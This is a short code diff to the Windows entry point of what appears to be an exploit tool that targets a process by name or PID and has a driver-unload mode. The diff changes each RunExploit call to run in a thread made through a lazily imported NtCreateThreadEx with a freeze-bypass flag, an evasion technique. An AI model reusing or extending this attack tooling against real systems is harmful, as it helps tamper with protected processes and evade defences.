@@ -10,6 +10,9 @@ int g_intExecutionMode = -1;
 
 int wmain(int argc, wchar_t* argv[])
 {
+
+    wil::unique_handle permaThread;
+
     if (!ParseArguments(argc, argv))
         return 1;
 
@@ -34,15 +37,28 @@ int wmain(int argc, wchar_t* argv[])
         if (ProcessGetPIDFromName(g_pwszProcessName, &dwProcessId))
         {
             PRINTDEBUG(L"[*] Found a process with name '%ws' and PID %d\n", g_pwszProcessName, dwProcessId);
-
-            return RunExploit(dwProcessId);
+            DWORD tid = 0;
+            auto status = LI_FN(NtCreateThreadEx)(&permaThread, MAXIMUM_ALLOWED, nullptr, NtCurrentProcess(),
+                &RunExploit, (LPVOID)dwProcessId, THREAD_CREATE_FLAGS_BYPASS_PROCESS_FREEZE,
+                0, 0, 0, nullptr);
+            if(status == STATUS_SUCCESS) WaitForSingleObject(permaThread.get(), INFINITE);
         }
     }
     else if (g_dwProcessId != 0 && g_intExecutionMode != DRIVER_UNLOAD_MODE)
     {
-        RunExploit(g_dwProcessId);
+        auto status = LI_FN(NtCreateThreadEx)(&permaThread, MAXIMUM_ALLOWED, nullptr, NtCurrentProcess(),
+            &RunExploit, (LPVOID)g_dwProcessId, THREAD_CREATE_FLAGS_BYPASS_PROCESS_FREEZE,
+            0, 0, 0, nullptr);
+        if (status == STATUS_SUCCESS) WaitForSingleObject(permaThread.get(), INFINITE);
     }
-    else RunExploit(0);
+    else
+    {
+        auto runZero = 0;
+        auto status = LI_FN(NtCreateThreadEx)(&permaThread, MAXIMUM_ALLOWED, nullptr, NtCurrentProcess(),
+            &RunExploit, (LPVOID)runZero, THREAD_CREATE_FLAGS_BYPASS_PROCESS_FREEZE,
+            0, 0, 0, nullptr);
+        if (status == STATUS_SUCCESS) WaitForSingleObject(permaThread.get(), INFINITE);
+    }
 
     return 0;
 }
